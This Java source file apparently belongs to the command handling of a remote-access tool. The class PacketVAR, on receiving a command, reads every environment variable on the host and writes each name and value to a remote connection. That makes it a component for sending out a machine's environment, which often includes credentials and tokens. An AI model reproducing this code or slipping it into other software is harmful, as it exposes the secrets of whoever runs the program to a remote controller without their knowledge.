package com.redpois0n.packets;

import java.util.Set;

import com.redpois0n.Connection;


public class PacketVAR extends Packet {

	@Override
	public void read(String line) throws Exception {
		Set<String> set = System.getenv().keySet();
		for (String str : set) {
			Connection.writeLine("VARPROP");
			Connection.writeLine(str);
			Connection.writeLine(System.getenv(str));
		}
	}

}
